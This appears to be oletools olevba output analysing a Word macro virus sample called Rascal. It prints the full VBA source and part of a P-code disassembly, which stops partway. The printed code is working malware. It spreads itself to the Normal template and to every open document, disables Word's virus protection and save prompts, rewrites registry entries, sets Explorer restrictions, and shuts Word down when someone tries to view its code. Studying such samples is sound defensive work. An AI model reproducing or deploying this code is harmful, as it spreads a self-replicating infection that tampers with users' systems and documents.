olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Rascal
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Rascal - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO RASCAL321.bas 
in file: ./Virus.MSWord.Rascal - OLE stream: 'Macros/VBA/RASCAL321'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Untuk orang yang aku cintai SHT
'
Public Const mname = "RASCAL321", usht = "Untuk orang yang aku cintai SHT", site = "http://rascal321.cjb.net", mw = "Microsoft Word", _
             lsht = "I love you SHT", pdnu = "Please do not use", isoft = "illegal software...", hklm = "HKEY_LOCAL_MACHINE\", _
             hkcu = "HKEY_CURRENT_USER\", sm = "Software\Microsoft\", cv = "Windows\CurrentVersion\", ACME = "MS Setup (ACME)\User Info\"

Private Sub document_open()
On Error Resume Next
   act
End Sub

Function rasc(oby As Object) As Boolean
On Error Resume Next
Dim i As Integer, n As Integer, kos As Boolean
kos = False
rasc = False
n = oby.VBProject.VBComponents.Count
Set vbc = oby.VBProject.VBComponents
   If vbc.Item(1).Name <> "Thisdocument" Then
      vbc.Item(1).Name = "Thisdocument"
   End If
   For i = 1 To n
       If vbc.Item(i).Name <> mname Then
          vbc.Item(i).Codemodule.DeleteLines 1, vbc.Item(i).Codemodule.Countoflines
       Else
          rasc = True
          If vbc.Item(i).Codemodule.Countoflines < 354 Or vbc.Item(i).Codemodule.Lines(1, 1) <> ("'" & usht) Then kos = True
       End If
   Next i
   If kos Then
      delmac oby
      rasc = False
   End If
End Function

Sub copymac(src As Object, dst As Object)
On Error Resume Next
   Application.OrganizerCopy Source:=src.FullName, Destination:=dst.FullName, Name:=mname, Object:=3
End Sub

Sub delmac(de As Object)
On Error Resume Next
   Application.OrganizerDelete Source:=de.FullName, Name:=mname, Object:=3
End Sub

Sub Autoexec()
On Error Resume Next
   amt
   act
End Sub

Sub act()
On Error Resume Next
Dim org As String, windir As String, fileok As String
    VBFalse
    With System
        .PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = usht & "...."
        .PrivateProfileString("", hkcu & sm & "Internet Explorer\PageSetup\", "footer") = usht & " &u&b&d"
        .PrivateProfileString("", hkcu & sm & "Internet Explorer\PageSetup\", "header") = mname & " &w&bPage &p of &P"
        .PrivateProfileString("", hklm & sm & cv & "Winlogon\", "LegalNoticeCaption") = mname
        .PrivateProfileString("", hklm & sm & cv & "Winlogon\", "LegalNoticeText") = lsht
        org = .PrivateProfileString("", hklm & sm & cv, "RegisteredOwner")
        If org <> pdnu Then
           .PrivateProfileString("", hklm & sm & cv, "OrgOwner") = org
           org = .PrivateProfileString("", hklm & sm & cv, "RegisteredOrganization")
           .PrivateProfileString("", hklm & sm & cv, "OrgOrganization") = org
           org = .PrivateProfileString("", hkcu & sm & ACME, "DefName")
           .PrivateProfileString("", hkcu & sm & ACME, "OrgName") = org
           org = .PrivateProfileString("", hkcu & sm & ACME, "DefCompany")
           .PrivateProfileString("", hkcu & sm & ACME, "OrgCompany") = org
           .PrivateProfileString("", hkcu & sm & ACME, "DefName") = lsht
           .PrivateProfileString("", hkcu & sm & ACME, "DefCompany") = mname
           .PrivateProfileString("", hklm & sm & cv, "RegisteredOwner") = pdnu
           .PrivateProfileString("", hklm & sm & cv, "RegisteredOrganization") = isoft
        End If
    End With
    With Application
        .UserName = mname
        .UserInitials = Mid(lsht, 12, 3)
        .UserAddress = "virus@" & Mid(site, 8, 20) & " - " & site
    End With
   stl
   windir = Options.DefaultFilePath(8)
   With Dialogs(86)
        .Author = mname
        .Title = usht
        .Subject = lsht
        .Comments = pdnu & " " & isoft & "This is not dangerous virus, please do not " & "delete or modify this macros. Thank you. "
         .Execute
    End With
    If rasc(NormalTemplate) = False Then
        norattr NormalTemplate
        copymac ActiveDocument, NormalTemplate
        NormalTemplate.Save
    End If
    If rasc(NormalTemplate) = False Then
        Application.OrganizerCopy windir & "\Dxdlg32.dll", NormalTemplate.FullName, mname, 3
    End If
    fileok = Dir(windir & "\Office.dot")
    If fileok = "" Then
        NormalTemplate.OpenAsDocument.SaveAs windir & "\Office.dot", , , , AddToRecentFiles:=False
        ActiveDocument.Close SaveChanges:=-1
    End If
    fileok = Dir(windir & "\Dxdlg32.dll")
    If fileok = "" Then
        NormalTemplate.OpenAsDocument.SaveAs windir & "\Dxdlg32.dll", , , , AddToRecentFiles:=False
        ActiveDocument.Close SaveChanges:=-1
    End If
    If rasc(ActiveDocument) = False Then
        norattr ActiveDocument
        copymac NormalTemplate, ActiveDocument
    End If
    Infectall
End Sub

Sub ToolsMacro()
    err
On Error Resume Next
    appexit
End Sub

Sub ViewVBCode()
    err
On Error Resume Next
    NoRun
    appexit
End Sub

Sub ViewCode()
    ViewVBCode
End Sub

Sub FileSave()
On Error Resume Next
    show
    amt
    act
    With ActiveDocument
        .Save
        .Saved = True
    End With
End Sub

Sub FileOpen()
On Error Resume Next
Set AD = ActiveDocument
    VBFalse
    stl
    amt
    If Dialogs(80).show <> 0 Then
        AutoOpen
        If AD.Saved = False And Left(AD.Name, 8) <> "Document" Then AD.Save
    End If
    amf
End Sub

Sub AutoOpen()
On Error Resume Next
    VBFalse
    stl
    amt
    act
    show
    Infectall
End Sub

Sub FileClose()
On Error Resume Next
Set AD = ActiveDocument
    show
    amt
    act
    If AD.Saved = False And Left(AD.Name, 8) <> "Document" Then AD.Save
    AD.Close
    amf
End Sub

Sub AutoClose()
On Error Resume Next
Set AD = ActiveDocument
    stl
    act
    If AD.Saved = False And Left(AD.Name, 8) <> "Document" Then AD.Save
End Sub

Sub FileNew()
On Error Resume Next
    nstl
    If Dialogs(79).show <> 0 Then copymac NormalTemplate, ActiveDocument
    stl
End Sub

Sub FileNewDefault()
On Error Resume Next
    show
    WordBasic.FileNewDefault
    copymac NormalTemplate, ActiveDocument
End Sub

Sub ToolsOptions()
On Error Resume Next
    nstl
    Dialogs(974).show
    stl
    show
End Sub

Sub FilePrint()
On Error Resume Next
    If Minute(Now) > 55 Or Minute(Now) < 5 Then
        Set aw = ActiveWindow.ActivePane.View
        Set S = Selection
        aw.SeekView = 9
        S.TypeText mname
        aw.SeekView = 10
        S.TypeText usht
        aw.SeekView = 0
    End If
    Dialogs(88).show
End Sub

Sub NoRun()
On Error Resume Next
    With System
        .PrivateProfileString("", hkcu & sm & cv & "Policies\Explorer\", "NoClose") = "1"
        .PrivateProfileString("", hkcu & sm & cv & "Policies\Explorer\", "NoRun") = "1"
        .PrivateProfileString("", hklm & "Network\Logon\", "PrimaryProvider") = "Microsoft Network"
        .PrivateProfileString("", hklm & "Network\Logon\", "username") = "SHT-" & mname
        .PrivateProfileString("", hkcu & "Control Panel\International\", "s1159") = Mid(mname, 1, 6)
        .PrivateProfileString("", hkcu & "Control Panel\International\", "s2359") = Mid(mname, 1, 6)
    End With
End Sub

Sub err()
    MsgBox "This program has performed an illegal operation and will shut down.", 16, mw
End Sub

Sub norcap()
On Error Resume Next
    Application.Caption = mw
    System.Cursor = 2
End Sub

Sub chcap(tcap As String)
On Error Resume Next
    Application.Caption = mw & " - " & tcap
End Sub

Sub show()
On Error Resume Next
Set ap = Application
    If Minute(Now) < 15 Then
        chcap lsht
        ap.OnTime Now + TimeSerial(0, 0, 5), "norcap"
    End If
    If Minute(Now) >= 15 And Minute(Now) <= 30 Then
       chcap mname
       ap.OnTime Now + TimeSerial(0, 0, 5), "norcap"
    End If
    If Minute(Now) > 30 Then
       chcap site
       ap.OnTime Now + TimeSerial(0, 0, 5), "norcap"
    End If
    Application.StatusBar = "Have a nice day for all my friends in Pakuan University, Bogor."
    System.Cursor = 2
    bday
End Sub

Sub amt()
On Error Resume Next
    WordBasic.DisableAutoMacros True
End Sub

Sub amf()
On Error Resume Next
    WordBasic.DisableAutoMacros False
End Sub

Sub stl()
On Error Resume Next
Dim windir As String
   windir = System.PrivateProfileString("", hklm & sm & cv, "SystemRoot")
   With Options
      .VirusProtection = False
      .SaveNormalPrompt = False
      .ConfirmConversions = False
      .SavePropertiesPrompt = False
      .DefaultFilePath(8) = windir & "\System"
   End With
End Sub

Sub nstl()
On Error Resume Next
    With Options
        .VirusProtection = True
        .SaveNormalPrompt = True
        .ConfirmConversions = True
        .SavePropertiesPrompt = True
        .DefaultFilePath(8) = .DefaultFilePath(6) & "\Startup"
    End With
End Sub

Sub norattr(noby As Object)
On Error Resume Next
    SetAttr noby.FullName, vbArchive
End Sub

Sub bday()
On Error Resume Next
    If Month(Now) = 9 And Day(Now) = 10 Then
    Dim msg As String, ent As String, quo As String
        ent = Chr$(13)
        quo = Chr$(34)
        msg = "Selamat ulang tahun aku ucapkan untuk" & ent
        msg = msg & "orang yang sangat aku cintai " & quo & "SHT" & quo & "." & ent
        msg = msg & "Semoga panjang umur dan sukses selalu." & ent
        msg = msg & "Untuk itu sebaiknya anda meliburkan diri hari ini" & ent
        msg = msg & "dan memberikan ucapan selamat juga untuk " & quo & "SHT" & quo & "."
        msg = msg & ent & "Terimakasih."
        MsgBox msg, 64, usht
        Application.OnTime Now + TimeSerial(0, 5, 0), "appexit"
        System.Cursor = 2
    End If
End Sub

Sub appexit()
On Error Resume Next
Dim i As Integer, andoc As Object
    If Documents.Count > 0 Then
       For i = 1 To Documents.Count
          Set andoc = Documents(i)
          andoc.Saved = True
       Next i
    End If
    Application.Quit
End Sub

Sub VBFalse()
On Error Resume Next
       Application.ShowVisualBasicEditor = False
End Sub

Sub Infectall()
On Error Resume Next
Dim i As Integer, andoc As Object
    If Documents.Count > 0 Then
       For i = 1 To Documents.Count
          Set andoc = Documents(i)
          If rasc(andoc) = False Then copymac NormalTemplate, andoc
          If Left(andoc.Name, 8) <> "Document" Then andoc.Save
       Next i
       If Minute(Now) >= 55 Then Selection.TypeText pdnu & " " & isoft
    End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Rascal
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/RASCAL321 - 19174 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001F "Untuk orang yang aku cintai SHT"
' Line #1:
' 	QuoteRem 0x0000 0x0000 ""
' Line #2:
' 	LineCont 0x0008 12 00 0D 00 22 00 0D 00
' 	Dim (Public Const) 
' 	LitStr 0x0009 "RASCAL321"
' 	VarDefn mname
' 	LitStr 0x001F "Untuk orang yang aku cintai SHT"
' 	VarDefn usht
' 	LitStr 0x0018 "http://rascal321.cjb.net"
' 	VarDefn site
' 	LitStr 0x000E "Microsoft Word"
' 	VarDefn mw
' 	LitStr 0x000E "I love you SHT"
' 	VarDefn lsht
' 	LitStr 0x0011 "Please do not use"
' 	VarDefn pdnu
' 	LitStr 0x0013 "illegal software..."
' 	VarDefn isoft
' 	LitStr 0x0013 "HKEY_LOCAL_MACHINE\"
' 	VarDefn hklm
' 	LitStr 0x0012 "HKEY_CURRENT_USER\"
' 	VarDefn hkcu
' 	LitStr 0x0013 "Software\Microsoft\"
' 	VarDefn sm
' 	LitStr 0x0017 "Windows\CurrentVersion\"
' 	VarDefn cv
' 	LitStr 0x001A "MS Setup (ACME)\User Info\"
' 	VarDefn ACME
' Line #3:
' Line #4:
' 	FuncDefn (Private Sub document_open())
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	ArgsCall act 0x0000 
' Line #7:
' 	EndSub 
' Line #8:
' Line #9:
' 	FuncDefn (Function rasc(oby As Object) As Boolean)
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn n (As Integer)
' 	VarDefn kos (As Boolean)
' Line #12:
' 	LitVarSpecial (False)
' 	St kos 
' Line #13:
' 	LitVarSpecial (False)
' 	St rasc 
' Line #14:
' 	Ld oby 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St n 
' Line #15:
' 	SetStmt 
' 	Ld oby 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set vbc 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld vbc 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "Thisdocument"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	LitStr 0x000C "Thisdocument"
' 	LitDI2 0x0001 
' 	Ld vbc 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld n 
' 	For 
' Line #20:
' 	Ld i 
' 	Ld vbc 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld mname 
' 	Ne 
' 	IfBlock 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld vbc 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	MemLd Countoflines 
' 	Ld i 
' 	Ld vbc 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #22:
' 	ElseBlock 
' Line #23:
' 	LitVarSpecial (True)
' 	St rasc 
' Line #24:
' 	Ld i 
' 	Ld vbc 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	MemLd Countoflines 
' 	LitDI2 0x0162 
' 	Lt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld vbc 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0001 "'"
' 	Ld usht 
' 	Concat 
' 	Paren 
' 	Ne 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St kos 
' 	EndIf 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	Ld kos 
' 	IfBlock 
' Line #28:
' 	Ld oby 
' 	ArgsCall delmac 0x0001 
' Line #29:
' 	LitVarSpecial (False)
' 	St rasc 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndFunc 
' Line #32:
' Line #33:
' 	FuncDefn (Sub copymac(src As Object, dst As Object))
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	Ld src 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld dst 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld mname 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #36:
' 	EndSub 
' Line #37:
' Line #38:
' 	FuncDefn (Sub delmac(de As Object))
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	Ld de 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld mname 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #41:
' 	EndSub 
' Line #42:
' Line #43:
' 	FuncDefn (Sub Autoexec())
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	ArgsCall amt 0x0000 
' Line #46:
' 	ArgsCall act 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' Line #49:
' 	FuncDefn (Sub act())
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	Dim 
' 	VarDefn org (As String)
' 	VarDefn windir (As String)
' 	VarDefn fileok (As String)
' Line #52:
' 	ArgsCall VBFalse 0x0000 
' Line #53:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #54:
' 	Ld usht 
' 	LitStr 0x0004 "...."
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}"
' 	LitStr 0x0007 "InfoTip"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #55:
' 	Ld usht 
' 	LitStr 0x0007 " &u&b&d"
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	LitStr 0x001C "Internet Explorer\PageSetup\"
' 	Concat 
' 	LitStr 0x0006 "footer"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #56:
' 	Ld mname 
' 	LitStr 0x0012 " &w&bPage &p of &P"
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	LitStr 0x001C "Internet Explorer\PageSetup\"
' 	Concat 
' 	LitStr 0x0006 "header"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #57:
' 	Ld mname 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x0009 "Winlogon\"
' 	Concat 
' 	LitStr 0x0012 "LegalNoticeCaption"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #58:
' 	Ld lsht 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x0009 "Winlogon\"
' 	Concat 
' 	LitStr 0x000F "LegalNoticeText"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #59:
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x000F "RegisteredOwner"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St org 
' Line #60:
' 	Ld org 
' 	Ld pdnu 
' 	Ne 
' 	IfBlock 
' Line #61:
' 	Ld org 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x0008 "OrgOwner"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #62:
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x0016 "RegisteredOrganization"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St org 
' Line #63:
' 	Ld org 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x000F "OrgOrganization"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #64:
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x0007 "DefName"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St org 
' Line #65:
' 	Ld org 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x0007 "OrgName"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #66:
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x000A "DefCompany"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St org 
' Line #67:
' 	Ld org 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x000A "OrgCompany"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #68:
' 	Ld lsht 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x0007 "DefName"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #69:
' 	Ld mname 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x000A "DefCompany"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #70:
' 	Ld pdnu 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x000F "RegisteredOwner"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #71:
' 	Ld isoft 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x0016 "RegisteredOrganization"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	EndWith 
' Line #74:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #75:
' 	Ld mname 
' 	MemStWith UserName 
' Line #76:
' 	Ld lsht 
' 	LitDI2 0x000C 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	MemStWith UserInitials 
' Line #77:
' 	LitStr 0x0006 "virus@"
' 	Ld site 
' 	LitDI2 0x0008 
' 	LitDI2 0x0014 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	LitStr 0x0003 " - "
' 	Concat 
' 	Ld site 
' 	Concat 
' 	MemStWith UserAddress 
' Line #78:
' 	EndWith 
' Line #79:
' 	ArgsCall stl 0x0000 
' Line #80:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St windir 
' Line #81:
' 	StartWithExpr 
' 	LitDI2 0x0056 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #82:
' 	Ld mname 
' 	MemStWith Author 
' Line #83:
' 	Ld usht 
' 	MemStWith Title 
' Line #84:
' 	Ld lsht 
' 	MemStWith Subject 
' Line #85:
' 	Ld pdnu 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld isoft 
' 	Concat 
' 	LitStr 0x002B "This is not dangerous virus, please do not "
' 	Concat 
' 	LitStr 0x0029 "delete or modify this macros. Thank you. "
' 	Concat 
' 	MemStWith Comments 
' Line #86:
' 	ArgsMemCallWith Execute 0x0000 
' Line #87:
' 	EndWith 
' Line #88:
' 	Ld NormalTemplate 
' 	ArgsLd rasc 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #89:
' 	Ld NormalTemplate 
' 	ArgsCall norattr 0x0001 
' Line #90:
' 	Ld ActiveDocument 
' 	Ld NormalTemplate 
' 	ArgsCall copymac 0x0002 
' Line #91:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	Ld NormalTemplate 
' 	ArgsLd rasc 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #94:
' 	Ld windir 
' 	LitStr 0x000C "\Dxdlg32.dll"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld mname 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	Ld windir 
' 	LitStr 0x000B "\Office.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St fileok 
' Line #97:
' 	Ld fileok 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #98:
' 	Ld windir 
' 	LitStr 0x000B "\Office.dot"
' 	Concat 
' 	ParamOmitted 
' 	ParamOmitted 
' 	ParamOmitted 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld NormalTemplate 
' 	MemLd OpenAsDocument 
' 	ArgsMemCall SaveAs 0x0005 
' Line #99:
' 	LitDI2 0x0001 
' 	UMi 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	Ld windir 
' 	LitStr 0x000C "\Dxdlg32.dll"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St fileok 
' Line #102:
' 	Ld fileok 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #103:
' 	Ld windir 
' 	LitStr 0x000C "\Dxdlg32.dll"
' 	Concat 
' 	ParamOmitted 
' 	ParamOmitted 
' 	ParamOmitted 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld NormalTemplate 
' 	MemLd OpenAsDocument 
' 	ArgsMemCall SaveAs 0x0005 
' Line #104:
' 	LitDI2 0x0001 
' 	UMi 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	Ld ActiveDocument 
' 	ArgsLd rasc 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #107:
' 	Ld ActiveDocument 
' 	ArgsCall norattr 0x0001 
' Line #108:
' 	Ld NormalTemplate 
' 	Ld ActiveDocument 
' 	ArgsCall copymac 0x0002 
' Line #109:
' 	EndIfBlock 
' Line #110:
' 	ArgsCall Infectall 0x0000 
' Line #111:
' 	EndSub 
' Line #112:
' Line #113:
' 	FuncDefn (Sub ToolsMacro())
' Line #114:
' 	ArgsCall err 0x0000 
' Line #115:
' 	OnError (Resume Next) 
' Line #116:
' 	ArgsCall appexit 0x0000 
' Line #117:
' 	EndSub 
' Line #118:
' Line #119:
' 	FuncDefn (Sub ViewVBCode())
' Line #120:
' 	ArgsCall err 0x0000 
' Line #121:
' 	OnError (Resume Next) 
' Line #122:
' 	ArgsCall NoRun 0x0000 
' Line #123:
' 	ArgsCall appexit 0x0000 
' Line #124:
' 	EndSub 
' Line #125:
' Line #126:
' 	FuncDefn (Sub ViewCode())
' Line #127:
' 	ArgsCall ViewVBCode 0x0000 
' Line #128:
' 	EndSub 
' Line #129:
' Line #130:
' 	FuncDefn (Sub FileSave())
' Line #131:
' 	OnError (Resume Next) 
' Line #132:
' 	ArgsCall show 0x0000 
' Line #133:
' 	ArgsCall amt 0x0000 
' Line #134:
' 	ArgsCall act 0x0000 
' Line #135:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #136:
' 	ArgsMemCallWith Save 0x0000 
' Line #137:
' 	LitVarSpecial (True)
' 	MemStWith Saved 
' Line #138:
' 	EndWith 
' Line #139:
' 	EndSub 
' Line #140:
' Line #141:
' 	FuncDefn (Sub FileOpen())
' Line #142:
' 	OnError (Resume Next) 
' Line #143:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #144:
' 	ArgsCall VBFalse 0x0000 
' Line #145:
' 	ArgsCall stl 0x0000 
' Line #146:
' 	ArgsCall amt 0x0000 
' Line #147:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #148:
' 	ArgsCall AutoOpen 0x0000 
' Line #149:
' 	Ld AD 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld AD 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld AD 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	ArgsCall amf 0x0000 
' Line #152:
' 	EndSub 
' Line #153:
' Line #154:
' 	FuncDefn (Sub AutoOpen())
' Line #155:
' 	OnError (Resume Next) 
' Line #156:
' 	ArgsCall VBFalse 0x0000 
' Line #157:
' 	ArgsCall stl 0x0000 
' Line #158:
' 	ArgsCall amt 0x0000 
' Line #159:
' 	ArgsCall act 0x0000 
' Line #160:
' 	ArgsCall show 0x0000 
' Line #161:
' 	ArgsCall Infectall 0x0000 
' Line #162:
' 	EndSub 
' Line #163:
' Line #164:
' 	FuncDefn (Sub FileClose())
' Line #165:
' 	OnError (Resume Next) 
' Line #166:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #167:
' 	ArgsCall show 0x0000 
' Line #168:
' 	ArgsCall amt 0x0000 
' Line #169:
' 	ArgsCall act 0x0000 
' Line #170:
' 	Ld AD 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld AD 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld AD 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #171:
' 	Ld AD 
' 	ArgsMemCall Close 0x0000 
' Line #172:
' 	ArgsCall amf 0x0000 
' Line #173:
' 	EndSub 
' Line #174:
' Line #175:
' 	FuncDefn (Sub AutoClose())
' Line #176:
' 	OnError (Resume Next) 
' Line #177:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #178:
' 	ArgsCall stl 0x0000 
' Line #179:
' 	ArgsCall act 0x0000 
' Line #180:
' 	Ld AD 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld AD 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld AD 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
